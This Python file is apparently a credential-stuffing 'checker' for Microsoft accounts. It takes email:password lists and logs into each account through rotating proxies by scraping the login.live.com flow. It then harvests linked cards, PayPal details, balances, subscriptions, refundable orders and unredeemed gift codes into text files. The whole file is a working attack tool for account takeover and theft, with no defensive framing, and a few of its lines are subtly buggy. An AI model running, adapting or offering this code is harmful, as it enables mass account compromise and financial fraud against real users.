import json, binascii, hashlib
import json as jsond
import time
import os
import random
import re
import string
import sys
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from uuid import uuid4
import requests
import urllib3
from colorama import Fore, init
from console.utils import set_title
from requests_toolbelt import MultipartEncoder
import atexit

urllib3.disable_warnings()
import os, time
from colorama import init, Fore

init(autoreset=True)

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

class Headers:
    xboxacc = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Sec-GPC": "1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": USER_AGENT,
    }
    createxbox = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://account.xbox.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-GPC": "1",
        "User-Agent": USER_AGENT,
        "X-Requested-With": "XMLHttpRequest"
    }
    default = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'identity',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    login = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    privacy = {
        'authority': 'privacynotice.account.microsoft.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://login.live.com',
        'referer': 'https://login.live.com/',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': USER_AGENT,
    }
    precord = {
        'authority': 'privacynotice.account.microsoft.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.7',
        'origin': 'https://privacynotice.account.microsoft.com',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': USER_AGENT,
    }
    notice = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Connection': 'keep-alive',
        'Referer': 'https://privacynotice.account.microsoft.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    midauth = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    midauth2 = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    payment = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    order = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip,deflate,br',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Host': 'account.microsoft.com',
        'MS-CV': 'XeULpZy1H023MIm9.7.51',
        'Origin': 'https://login.live.com',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT
    }
    subs = {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-GB,en;q=0.9,bn;q=0.8,en-US;q=0.7',
      'Connection': 'keep-alive',
      'Correlation-Context': 'v=1,ms.b.tel.market=en-US,ms.b.tel.scenario=ust.amc.services.amcserviceslanding,ms.c.ust.scenarioStep=AmcServicesLanding.Index',
      'MS-CV': 'MhZzfSVfVEGq++JF.33.59',
      'Referer': 'https://account.microsoft.com/services?lang=en-US',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': USER_AGENT,
      'X-Requested-With': 'XMLHttpRequest',
      'X-TzOffset': '360',
      'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
  }

    @staticmethod
    def update(header, dict2):
        header = header.copy()
        header.update(dict2)
        return header

def clear():
    if 'posix' in os.name:
        os.system("clear")
    else:
        os.system("cls")

text = """
██████╗ ██╗      █████╗ ███████╗███████╗    ███████╗███████╗ ██████╗████████╗██╗  ██╗███████╗██████╗ ██╗
██╔══██╗██║     ██╔══██╗╚══███╔╝██╔════╝    ██╔════╝██╔════╝██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗██║
██████╔╝██║     ███████║  ███╔╝ █████╗      █████╗  █████╗  ██║        ██║   ███████║█████╗  ██████╔╝██║
██╔══██╗██║     ██╔══██║ ███╔╝  ██╔══╝      ██╔══╝  ██╔══╝  ██║        ██║   ██╔══██║██╔══╝  ██╔══██╗╚═╝
██████╔╝███████╗██║  ██║███████╗███████╗    ██║     ███████╗╚██████╗   ██║   ██║  ██║███████╗██║  ██║██╗
╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝
                                            ©️ | Made By @sarthakkul ; Discord 
                                            ©️ | Made By @sarthakog ; Telegram                                                                  

"""

def screen(total, valid, invalid, checked, pm, pp, codes, xbox, balance, start):
    remain = abs(total - checked)
    clear()
    print(Fore.YELLOW+text)
    print(f"""
[🌐] {Fore.WHITE}Total Accounts: {total} ({checked}/{total})
[♻️] {Fore.GREEN}Remaining Accounts: {remain}
[🚨] {Fore.RED}Invalid: {invalid}
[📢] {Fore.GREEN} Hits: {valid}
    [💳] Payment Methods: {pm}
    [🅿️] PayPal Linked: {pp}
    [🎯] Xbox Hit: {xbox}
    [🏆] Codes: {codes}
    [💲] Balance acc: {balance}
[👀] {Fore.LIGHTCYAN_EX}Hit Percentage: {round((100*valid)/checked)}%    
[🕐] {Fore.LIGHTMAGENTA_EX}Time Elpased: {round(time.time() - start)}s  
""")
capture=False
wscreen = True
Total = len(open("accounts.txt", "r").read().splitlines())
xbox = 0
dead = 0
minecraft = 0
lol = 0
valid = 0
rpm = 0
rpp = 0
bal = 0
codes = 0
start = time.time()
def log(text):
  if wscreen: return
  print(text)

def dosh(s):
    accountXbox = s.get("https://account.xbox.com/", headers=Headers.xboxacc).text

    if "fmHF" in accountXbox:
        xbox_json = {
            "fmHF": accountXbox.split('id="fmHF" action="')[1].split('"')[0],
            "pprid": accountXbox.split('id="pprid" value="')[1].split('"')[0],
            "nap": accountXbox.split('id="NAP" value="')[1].split('"')[0],
            "anon": accountXbox.split('id="ANON" value="')[1].split('"')[0],
            "t": accountXbox.split('id="t" value="')[1].split('"')[0],
        }

        verifyToken = (s.post(xbox_json["fmHF"], timeout=20, headers={"Content-Type": "application/x-www-form-urlencoded"}, data={"pprid": xbox_json["pprid"], "NAP": xbox_json["nap"], "ANON": xbox_json["anon"], "t": xbox_json["t"]}).text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0])

        s.post("https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount", headers=Headers.update(Headers.createxbox, {"Referer": xbox_json["fmHF"], "__RequestVerificationToken": verifyToken}), data={"partnerOptInChoice": "false", "msftOptInChoice": "false", "isChild": "true","returnUrl": "https://www.xbox.com/en-US/?lc=1033",})

    getXbl = s.get("https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/").text

    try:
        rel = getXbl.split('"http://mp.microsoft.com/":{')[1].split("},")[0]
        json_obj = json.loads("{" + rel + "}")
        xbl_auth = "XBL3.0 x=" + json_obj["userHash"] + ";" + json_obj["token"]
        return xbl_auth
    except: return




def getpms(s, mscred, tkn):
    global rpp, rpm, bal 

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
         'Correlation-Context': 'v=1,ms.b.tel.market=fr-FR,ms.b.qos.rootOperationName=GLOBAL.OAUTH.GETTOKENS,ms.b.tel.scenario=ust.amc.billing.payment-north-star,ms.c.ust.scenarioStep=PaymentNorthStarOboAuthStart',
        'MS-CV': 'q+JaVmVsSEqkw+PD.7.21',
        'Referer': 'https://account.microsoft.com/billing/payments?lang=en-EN',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        '__RequestVerificationToken': tkn,
          'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'scopes': 'pidl',
    }

    response = s.get(
        'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
        params=params, 
        headers=headers,
    )
    token = response.json()[0]['token']
    headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'MSADELEGATE1.0={token}',
      'content-type': 'application/json',
    'ms-cv': 'iUtIoK9M1eP8bdEOqqKjU7.2',
    'origin': 'https://account.microsoft.com',
    'priority': 'u=1, i',
    'referer': 'https://account.microsoft.com/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'x-ms-test': 'undefined',
}

    getpm = s.get(
    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-EN&partner=northstarweb',
    headers=headers,
).json()
    act = []
    pp=None
    balance = 0.0
    cs = [] 
    for pm in getpm:
        if isinstance(pm, str): continue
        details = pm.get("details", {})
        balance+=details.get("balance", 0.0)
        if (cur:=details.get('currency', "NaN"))!="NaN": cs.append(cur)
        if pm["paymentMethod"]["paymentMethodType"]=="paypal" and pm["status"]=="Active" and pp is None:
            pp = pm
            continue
        if pm["paymentMethod"]["paymentMethodFamily"] == "credit_card" and pm["status"] == "Active":
            act.append(pm)
    pptxt=f"PayPal linked: False\n- Total Account Balance: {balance}\n- Currency: {cs}\n" if not pp else f"PayPal linked: True Balance: {pp['details']['balance']} Status: {pp['status']}\n- Total Account Balance: {balance}\n- Currency: {cs}\n"
    if balance!=0.0:
        bal += 1
        with open("capture/money.txt", "a") as f:
            txt = f"{mscred} | Balance: {balance} | Currency: {cs}"
            f.write(txt+"\n")
    if "True" in pptxt:
        rpp += 1
        with open("capture/paypal.txt", "a") as f:
            f.write(mscred+f" | Email: {pp['details']['email']}\n")        
    return act, pptxt

def getsubs(s):
  while True:
    try:
        response = s.get('https://account.microsoft.com/services?lang=en-US', headers=Headers.payment)
        break
    except request_exceptions:continue
    except Exception as e:
        slog(e,"r")
        return 'lol'
  try: 
      vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
  except:
    raise Exception("Failed to get vrf token")

  r = s.get("https://account.microsoft.com/services/api/subscriptions-and-alerts?excludeWindowsStoreInstallOptions=false&excludeLegacySubscriptions=false", headers = Headers.update(Headers.subs, {'Referer': response.url, '__RequestVerificationToken': vrf_token}))
  d = r.json()
  if len(d["active"]) == 0:
    return {}
  subs = {}
  for sub in d["active"]:
    for item in sub["payNow"]["items"]:
      subs[item["name"]] = sub["productRenewal"]["startDateShortString"] if sub["productRenewal"] else "Unknown"
  return subs    

set_title(f"Spooky Fetcher | {lol}/{Total} || MC: {minecraft} | Xbox Pass: {xbox} | Bad: {dead}")
request_exceptions = (requests.exceptions.SSLError,requests.exceptions.ProxyError,requests.exceptions.Timeout)
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
def slog(content, status: str="c") -> None:
    if wscreen: return
    if status=="y":
        colour = Fore.YELLOW
    elif status=="c":
        colour = Fore.CYAN
    elif status=="r":
        colour = Fore.RED
    elif status=="new":
        colour = Fore.LIGHTYELLOW_EX
    sys.stdout.write(
            f"{colour}{content}"
            + "\n"
            + Fore.RESET
        )    
def remove_content(file_path : str, line_to_remove : str):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    lines = [line for line in lines if line.strip() != line_to_remove.strip()]
    with open(file_path, 'w') as file:
        file.writelines(lines)
def fetch(mscred):
 try:
    global lol,xbox,minecraft,dead, valid, codes
    s = requests.session()
    roxy = open("proxies.txt").read().splitlines()
    if not roxy== []:
        roxy = random.choice(roxy)
        proxies = {
            "https" : f"http://{roxy}"
        }
    else:
        proxies = None
    s.proxies = proxies
    email, password = mscred.strip().split(":")
    lol+=1
    if wscreen:
      screen(Total, valid, dead, lol, rpm, rpp, codes, xbox, bal, start)
    while True:
        try:
            response = s.get('https://login.live.com/ppsecure/post.srf', headers=Headers.default,timeout=20).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            dead += 1
            slog(str(e), "r")
            return 'lol'
    try:
        ppft = response.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
        log_url = response.split(",urlPost:'")[1].split("'")[0]
    except:
        dead += 1
        slog("[-] Unknown Error (Proxies probably banned)")
        return 'lol'
    log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'

    while True:
        try:
            response = s.post(log_url,timeout=20,data=log_data,headers=Headers.login)
            break
        except request_exceptions as e:
            continue
        except Exception as e:
            dead += 1
            slog(e,"r")
            return 'lol'
    if 'https://privacynotice.account.microsoft.com/notice' in response.text:
        privNotifUrl = response.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
        corelationId = response.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
        mCode = response.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
        while True:
            try:
                privNotifPage = s.post(privNotifUrl, headers=Headers.update(Headers.privacy, {'path' : privNotifUrl.replace('https://privacynotice.account.microsoft.com','')}), data={'correlation_id':corelationId, 'code':mCode}).text
                break
            except:
                continue
        try:
          m = MultipartEncoder(fields={'AppName': 'ALC',
            'ClientId': privNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
            'ConsentSurface': 'SISU',
            'ConsentType': 'ucsisunotice',
            'correlation_id': corelationId,
            'CountryRegion': privNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
            'DeviceId':'' ,
            'EncryptedRequestPayload': privNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0]
            ,'FormFactor': 'Desktop',
            'InitVector':privNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
            'Market': privNotifPage.split("ucis.Market = '")[1].split("'")[0],
            'ModelType': 'ucsisunotice',
            'ModelVersion': '1.11',
            'NoticeId': privNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
            'Platform': 'Web',
            'UserId': privNotifPage.split("ucis.UserId = '")[1].split("'")[0],
            'UserVersion': '1'},boundary='----WebKitFormBoundary' \
                    + ''.join(random.sample(string.ascii_letters + string.digits, 16)))
        except Exception as e:
            slog(e, 'r')
            dead += 1
            return 'gaybehavior'
        while True:
            try:
                response = s.post('https://privacynotice.account.microsoft.com/recordnotice', headers=Headers.update(Headers.precord, {'referer': privNotifUrl, 'content-type': m.content_type}), data=m)
                break
            except:
                continue

        while True:
            try:
                response = s.get(urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1]), headers=Headers.notice)
                break
            except:
                continue


    try:
        ppft2 = re.findall("sFT:'(.+?(?=\'))", response.text)[0],
        url_log2 = re.findall("urlPost:'(.+?(?=\'))", response.text)[0]
    except:
        dead +=1
        slog("[-] Invalid microsoft acc!","c")
        remove_content("accounts.txt",mscred)
        return 'lol'


    log_data2 = {
        "LoginOptions": "3",
        "type": "28",
        "ctx": "",
        "hpgrequestid": "",
        "PPFT": ppft2,
        "i19": "19130"
    }
    while True:
        try:
            midAuth2 = s.post(url_log2,timeout=20,data=log_data2,headers=Headers.update(Headers.midauth, {'Referer': log_url})).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            dead += 1
            slog(e,"r")
            return 'lol'
    while "fmHF" in midAuth2:
        midAuth2 = {
"fmHF": midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0],
"pprid": midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
"nap": midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
"anon": midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
"t": midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]} 
        data = {
    'pprid': midAuth2["fmHF"],
    'NAP': midAuth2['nap'],
    'ANON': midAuth2['anon'],
    't': midAuth2['t'],
}
        loda_lund = midAuth2['fmHF']
        while True:
            try:
                midAuth2 = s.post(loda_lund, data=data, headers=Headers.midauth2).text
                break
            except request_exceptions:
                continue
            except Exception as e:
                dead += 1
                slog(e,"r")
                return 'lol'
    valid += 1  
    params = {
        'fref': 'home.drawers.payment-options.manage-payment',
        'refd': 'account.microsoft.com'
    }
    while True:
        try:
            response = s.get('https://account.microsoft.com/billing/payments', params=params, headers=Headers.payment)
            break
        except request_exceptions:continue
        except Exception as e:
            dead += 1
            slog(e,"r")
            return 'lol'

    try: 
        vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    except:
        try:
            fuck = response.text.split('<meta name="description" content="')[1].split('"')[0]
            if fuck == "Try again later":
                dead += 1
                log(Fore.LIGHTYELLOW_EX +f"[-] Microsoft Server Down: Please {fuck}") 
        except: 
            pass

    if capture:
        def umm(mscr):
            global xbox, rpm
            try:
                pms, pp=getpms(s, mscred, vrf_token)
                if len(pms)!=0:
                  rpm+=1
                  open("cards.txt", "a").write(mscr+"\n")
                txt=f"Found {len(pms)} cards: {mscr.split(':')[0]}\n"+"\n".join(f"- Card: ***{pm['details']['lastFourDigits']} Balance: {pm['details']['balance']} {pm['details']['address']['country']}" for pm in pms)
                log(Fore.BLUE+txt+"\n- "+pp)
            except Exception as e:
                log(f"{Fore.RED}Failed to get xbl authorization: {e}{Fore.RESET}") 
            try:
              subs = getsubs(s)
              stxt = f"{Fore.BLUE}Found {len(subs)} Active subs: {mscred.split(':')[0]}\n"
              for k, v in subs.items():
                if 'game pass' in k.lower(): xbox += 1
                stxt += f"- {k} | Active till {v}\n"
                f = open(f"activesubs/{k}.txt", "a")
                f.write(mscred+"\n")
                f.close()
              log(stxt)  
            except Exception as e:
              log(f"{Fore.RED}Failed to get Active Subs: {e}{Fore.RESET}")
            if wscreen:
              screen(Total, valid, dead, lol, rpm, rpp, codes, xbox, bal, start)

        threading.Thread(target=umm, args=(mscred, )).start()

    params = {
        'period': 'AllTime',
        'orderTypeFilter': 'All',
        'filterChangeCount': '0',
        'isInD365Orders': True,
        'isPiDetailsRequired': True,
        'timeZoneOffsetMinutes': '-330',
    }
    json_data = s.get("https://account.microsoft.com/billing/orders/list", params=params, headers=Headers.update(Headers.order, {'Referer': response.url, 'Referer': log_url, '__RequestVerificationToken': vrf_token})).json()
    xboxlol = 0
    try:
        total_orders = json_data['orders']
        orders_count = len(total_orders)
        txt=Fore.BLUE + f"[+] Total {orders_count} Orders Found: {email}{Fore.RESET}\n"
        processed_emails = set()
        msacc=False
        for index, order in enumerate(total_orders, start=1):
            date = order['localSubmittedDate']
            for p in order['paymentInstruments']:
                if 'account' in p.get('localName', p.get('id', 'account')).lower():
                    msacc = True
                    break 
            for item_index, item in enumerate(order['items'], start=1):
              date = order['localSubmittedDate']

              if msacc and item.get('isRefundEligible', False):
                open('refundable.txt', 'a').write(f"{mscred} | Refundable Price: {item.get('totalListPrice', 0.0)}\n")
                log(f"{Fore.LIGHTGREEN_EX} Found Refundable Item -> {email} | Refundable Price: {item.get('totalListPrice', 0.0)}")
                refundable += 1
              try:

                order_name = item['localTitle']
                order_status = item.get('itemState', "Physical")
                if order_status.lower() not in ["cancelled", "pending", "failed", "giftredeemed", "authorizationfailed", "refunded", "canceled", "giftsent", "chargeback", "physical"]:

                    open(f"specific/{order_name.replace('/', '.')}.txt", 'a').write(mscred+"\n")
                txt+=Fore.CYAN + f"[{index}.{item_index}] Product Name: {order_name}{Fore.RESET}\n"
                txt+=Fore.LIGHTCYAN_EX + f"[{index}.{item_index}] Status: {order_status} | {date}{Fore.RESET}\n"
                if 'tokenDetails' in item:
                  for token in item['tokenDetails']:
                    if token.get('state', '').lower() in ["redeemed", "notfound", "claimed"]:
                        continue
                    open(f"codes.txt", 'a').write(f"{token.get('tokenCode')} : {order.get('address', {}).get('regionName')} : {order_name} : {token.get('state')}\n")
                    codes+=1
                if "Game Pass" in order_name:
                    xboxlol += 1

                elif "GiftSent" in order_status:

                    giftcodeother = item.get('giftCode', None)
                    if giftcodeother:
                      codes += 1
                      ipother = order['address']['regionName']
                      open("codes.txt", "a").write(giftcodeother + " : " + ipother + " : " + order_name + "\n")
              except Exception as e:
                log(e)
                continue
        log(txt)
        if orders_count > 0:
            processed_emails.add(mscred)
        for email in processed_emails:
            open("working_mails.txt", "a").write(email + "\n")
    except KeyError as e:
        orders_count = 0
        log(e)
        log(total_orders)
        log("[-] No Orders Found. ")
        pass
    except Exception as e:
        orders_count = 0
        log("[-] An error occurred:", e)
        return 'exit'

    if orders_count == 0:
        open("work0.txt", "a").write(mscred + "\n")
    if not capture and xboxlol > 0:

        xbox += 1
        #open("gamepasses.txt", "a").write(mscred+"\n")
    set_title(f"Spooky Fetcher | {lol}/{Total} || MC: {minecraft} | Xbox Pass: {xbox} | Bad: {dead}")
    remove_content("accounts.txt", mscred)
    if wscreen:
      screen(Total, valid, dead, lol, rpm, rpp, codes, xbox, bal, start)
 except Exception as e: print(e)

init()
count = 0

@atexit.register
def exit_handler():
    if wscreen:
      try:  
        screen(Total, valid, dead, lol, rpm, rpp, codes, xbox, bal, start)
      except:
        pass
    input("Press enter to exit....")

if __name__ == "__main__":


    ask=input("Full capture? y/n\n> ")
    if "y" in ask:
      capture=True
    ask = input("Do you want to Log all process happening? y/n\n> ")
    if "y" in ask:
      wscreen = False

    accounts = open("accounts.txt", "r").read().splitlines()
    threads = int(input(f"{Fore.BLUE}Input Thread amount: "))
    with ThreadPoolExecutor(max_workers=threads) as exc:
        for acc in accounts:
            exc.submit(fetch, acc)